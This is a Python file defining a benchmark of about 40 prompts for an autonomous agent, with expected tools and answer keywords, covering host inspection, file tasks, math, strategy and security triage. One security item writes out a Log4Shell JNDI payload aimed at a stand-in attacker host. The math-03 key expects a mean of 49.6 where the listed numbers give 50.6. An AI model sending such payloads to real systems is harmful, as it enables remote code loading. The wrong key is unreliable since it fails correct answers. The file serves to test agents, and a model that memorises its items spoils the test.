"""
UAOS Evaluation Benchmark Dataset (~40 Prompts)

Categories:
1. host_info  (8 cases): Hostname, OS details, CPU, disk, memory, Python version, IP.
2. files      (8 cases): Reading, listing, searching, pattern matching, JSON validation.
3. math       (8 cases): SHA256 hashing, numerical computation, statistics, CSV sum.
4. strategy   (8 cases): DAG decomposition, triage priority, root-cause plan, architecture review.
5. soc        (8 cases): Auth log triage, failed login spikes, Log4j detection, process inspection.

Each item contains ground-truth validation criteria to verify tool-calling accuracy
and output grounding.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Callable


@dataclass
class EvalCase:
    id: str
    category: str
    prompt: str
    required_skills: list[str] = field(default_factory=list)
    expected_tools: list[str] = field(default_factory=list)
    expected_keywords: list[str] = field(default_factory=list)
    requires_grounding: bool = True
    timeout_seconds: int = 60


EVAL_DATASET: list[EvalCase] = [
    # ── 1. Host Info (8 cases) ──────────────────────────────────
    EvalCase(
        id="host-01",
        category="host_info",
        prompt="Identify the exact system hostname of this machine using an execution tool.",
        required_skills=["command_execution"],
        expected_tools=["execute_command"],
        expected_keywords=[],
    ),
    EvalCase(
        id="host-02",
        category="host_info",
        prompt="Determine the operating system and platform version using system commands.",
        required_skills=["command_execution"],
        expected_tools=["execute_command"],
        expected_keywords=[],
    ),
    EvalCase(
        id="host-03",
        category="host_info",
        prompt="Check available disk storage on the current drive using shell commands.",
        required_skills=["command_execution"],
        expected_tools=["execute_command"],
        expected_keywords=[],
    ),
    EvalCase(
        id="host-04",
        category="host_info",
        prompt="Identify the active Python runtime version installed in the current environment.",
        required_skills=["python_execution", "command_execution"],
        expected_tools=["execute_python", "execute_command"],
        expected_keywords=["Python", "3."],
    ),
    EvalCase(
        id="host-05",
        category="host_info",
        prompt="List the active network interface IP addresses on this host.",
        required_skills=["command_execution"],
        expected_tools=["execute_command"],
        expected_keywords=[],
    ),
    EvalCase(
        id="host-06",
        category="host_info",
        prompt="Check the total and available RAM on this host using Python or system tools.",
        required_skills=["python_execution", "command_execution"],
        expected_tools=["execute_python", "execute_command"],
        expected_keywords=[],
    ),
    EvalCase(
        id="host-07",
        category="host_info",
        prompt="Determine the CPU processor architecture and core count of this machine.",
        required_skills=["python_execution", "command_execution"],
        expected_tools=["execute_python", "execute_command"],
        expected_keywords=[],
    ),
    EvalCase(
        id="host-08",
        category="host_info",
        prompt="Get the current system uptime or boot timestamp.",
        required_skills=["command_execution", "python_execution"],
        expected_tools=["execute_command", "execute_python"],
        expected_keywords=[],
    ),

    # ── 2. Files & Storage (8 cases) ────────────────────────────
    EvalCase(
        id="file-01",
        category="files",
        prompt="Read the first 10 lines of README.md in the current workspace directory.",
        required_skills=["file_read"],
        expected_tools=["read_file"],
        expected_keywords=["UAOS", "Autonomous"],
    ),
    EvalCase(
        id="file-02",
        category="files",
        prompt="List all top-level files and directories in the workspace root.",
        required_skills=["file_list", "command_execution"],
        expected_tools=["list_directory", "execute_command"],
        expected_keywords=["src", "tests"],
    ),
    EvalCase(
        id="file-03",
        category="files",
        prompt="Check if the file 'runtime_settings.json' exists in the workspace root.",
        required_skills=["file_read", "command_execution"],
        expected_tools=["read_file", "execute_command"],
        expected_keywords=[],
    ),
    EvalCase(
        id="file-04",
        category="files",
        prompt="Inspect pyproject.toml to extract the declared project version.",
        required_skills=["file_read"],
        expected_tools=["read_file"],
        expected_keywords=["version", "0."],
    ),
    EvalCase(
        id="file-05",
        category="files",
        prompt="Search for occurrences of 'UniversalWorkerAgent' across python files in src/.",
        required_skills=["command_execution", "file_read"],
        expected_tools=["execute_command", "read_file"],
        expected_keywords=["universal_worker.py"],
    ),
    EvalCase(
        id="file-06",
        category="files",
        prompt="Parse runtime_settings.json and extract the configured llm_model name.",
        required_skills=["file_read", "python_execution"],
        expected_tools=["read_file", "execute_python"],
        expected_keywords=[],
    ),
    EvalCase(
        id="file-07",
        category="files",
        prompt="Count the number of test files located under tests/unit/.",
        required_skills=["command_execution", "python_execution"],
        expected_tools=["execute_command", "execute_python"],
        expected_keywords=["test_"],
    ),
    EvalCase(
        id="file-08",
        category="files",
        prompt="Verify that Dockerfile exists and inspect the base container image name.",
        required_skills=["file_read"],
        expected_tools=["read_file"],
        expected_keywords=["FROM", "python:"],
    ),

    # ── 3. Math & Computation (8 cases) ─────────────────────────
    EvalCase(
        id="math-01",
        category="math",
        prompt="Calculate the SHA256 hex digest of the string 'UAOS_HERMES_EVAL_2026' using Python.",
        required_skills=["python_execution"],
        expected_tools=["execute_python"],
        expected_keywords=[],
    ),
    EvalCase(
        id="math-02",
        category="math",
        prompt="Compute the 45th Fibonacci number using Python.",
        required_skills=["python_execution"],
        expected_tools=["execute_python"],
        expected_keywords=["1134903170"],
    ),
    EvalCase(
        id="math-03",
        category="math",
        prompt="Calculate the mean and standard deviation of numbers [12, 45, 67, 89, 23, 56, 78, 90, 34, 12].",
        required_skills=["python_execution"],
        expected_tools=["execute_python"],
        expected_keywords=["49.6"],
    ),
    EvalCase(
        id="math-04",
        category="math",
        prompt="Find all prime numbers between 100 and 150 using Python code.",
        required_skills=["python_execution"],
        expected_tools=["execute_python"],
        expected_keywords=["101", "103", "107", "109", "113", "127", "131", "137", "139", "149"],
    ),
    EvalCase(
        id="math-05",
        category="math",
        prompt="Given CSV data 'item,price\\napple,1.5\\nbanana,0.75\\norange,1.25', compute the total cost.",
        required_skills=["python_execution"],
        expected_tools=["execute_python"],
        expected_keywords=["3.5"],
    ),
    EvalCase(
        id="math-06",
        category="math",
        prompt="Calculate the number of days between 2024-01-15 and 2026-10-04.",
        required_skills=["python_execution"],
        expected_tools=["execute_python"],
        expected_keywords=["993"],
    ),
    EvalCase(
        id="math-07",
        category="math",
        prompt="Compute the determinant of the 3x3 matrix [[2, 1, 3], [4, 5, 6], [7, 8, 9]].",
        required_skills=["python_execution"],
        expected_tools=["execute_python"],
        expected_keywords=["-9"],
    ),
    EvalCase(
        id="math-08",
        category="math",
        prompt="Generate the first 6 terms of the Collatz sequence starting at n=27.",
        required_skills=["python_execution"],
        expected_tools=["execute_python"],
        expected_keywords=["27", "82", "41", "124", "62", "31"],
    ),

    # ── 4. Strategy & Reasoning (8 cases) ───────────────────────
    EvalCase(
        id="strat-01",
        category="strategy",
        prompt="Plan a 3-step sequential migration of a legacy SQL database to Cloud Spanner, identifying rollback criteria.",
        required_skills=[],
        expected_tools=[],
        expected_keywords=["schema", "data", "validation", "rollback"],
        requires_grounding=False,
    ),
    EvalCase(
        id="strat-02",
        category="strategy",
        prompt="Evaluate the architectural trade-offs between asynchronous event-bus streaming and synchronous HTTP polling for agent telemetry.",
        required_skills=[],
        expected_tools=[],
        expected_keywords=["latency", "throughput", "backpressure"],
        requires_grounding=False,
    ),
    EvalCase(
        id="strat-03",
        category="strategy",
        prompt="Determine the severity and immediate containment steps for an alert reporting unauthorized root SSH key injection on an internal jumpbox.",
        required_skills=[],
        expected_tools=[],
        expected_keywords=["isolate", "revoke", "audit", "forensic"],
        requires_grounding=False,
    ),
    EvalCase(
        id="strat-04",
        category="strategy",
        prompt="Formulate a canary deployment strategy for an autonomous worker cluster processing 10,000 tasks/hr with zero downtime.",
        required_skills=[],
        expected_tools=[],
        expected_keywords=["canary", "health check", "rollback", "traffic"],
        requires_grounding=False,
    ),
    EvalCase(
        id="strat-05",
        category="strategy",
        prompt="Compare SQLite with FTS5 vs ChromaDB vector store for agent cross-workflow episodic memory recall.",
        required_skills=[],
        expected_tools=[],
        expected_keywords=["FTS5", "BM25", "embeddings", "latency"],
        requires_grounding=False,
    ),
    EvalCase(
        id="strat-06",
        category="strategy",
        prompt="Outline a protocol for preventing prompt injection when an autonomous web scraping tool reads untrusted external HTML.",
        required_skills=[],
        expected_tools=[],
        expected_keywords=["sanitize", "untrusted", "quarantine", "isolation"],
        requires_grounding=False,
    ),
    EvalCase(
        id="strat-07",
        category="strategy",
        prompt="Design a circuit breaker policy for local LLM inference timeouts during high-concurrency batch execution.",
        required_skills=[],
        expected_tools=[],
        expected_keywords=["timeout", "fallback", "retry", "threshold"],
        requires_grounding=False,
    ),
    EvalCase(
        id="strat-08",
        category="strategy",
        prompt="Decompose a security audit task for a microservices repo into distinct, verifiable subtasks with dependencies.",
        required_skills=[],
        expected_tools=[],
        expected_keywords=["dependencies", "static analysis", "vulnerabilities", "report"],
        requires_grounding=False,
    ),

    # ── 5. SOC & Security Investigation (8 cases) ───────────────
    EvalCase(
        id="soc-01",
        category="soc",
        prompt="Search sample authentication logs for multiple failed SSH attempts followed by an accepted login.",
        required_skills=["soc_tools", "command_execution"],
        expected_tools=["soc_triage", "execute_command"],
        expected_keywords=[],
    ),
    EvalCase(
        id="soc-02",
        category="soc",
        prompt="Inspect network connection tables or netstat output for listening ports and established external sockets.",
        required_skills=["command_execution"],
        expected_tools=["execute_command"],
        expected_keywords=[],
    ),
    EvalCase(
        id="soc-03",
        category="soc",
        prompt="Audit the active scheduled cron jobs or Windows scheduled tasks for suspicious unsigned binaries.",
        required_skills=["cronjob_manage", "command_execution"],
        expected_tools=["cronjob_manage", "execute_command"],
        expected_keywords=[],
    ),
    EvalCase(
        id="soc-04",
        category="soc",
        prompt="Analyze a log line '${jndi:ldap://attacker.com/exploit}' and identify the CVE, impact, and mitigation.",
        required_skills=[],
        expected_tools=[],
        expected_keywords=["CVE-2021-44228", "Log4j", "Log4Shell"],
        requires_grounding=False,
    ),
    EvalCase(
        id="soc-05",
        category="soc",
        prompt="Check file hashes of executable files in the target directory against known benign baselines.",
        required_skills=["python_execution", "command_execution"],
        expected_tools=["execute_python", "execute_command"],
        expected_keywords=[],
    ),
    EvalCase(
        id="soc-06",
        category="soc",
        prompt="Triage an alert of unusual powershell execution with -EncodedCommand parameter and explain the decode steps.",
        required_skills=["python_execution"],
        expected_tools=["execute_python"],
        expected_keywords=["base64", "decode", "utf-16le"],
    ),
    EvalCase(
        id="soc-07",
        category="soc",
        prompt="Verify user accounts currently present on the system and identify accounts with administrative privileges.",
        required_skills=["command_execution"],
        expected_tools=["execute_command"],
        expected_keywords=[],
    ),
    EvalCase(
        id="soc-08",
        category="soc",
        prompt="Investigate firewall configuration and check whether inbound SSH or RDP is unrestricted from 0.0.0.0/0.",
        required_skills=["command_execution"],
        expected_tools=["execute_command"],
        expected_keywords=[],
    ),
]
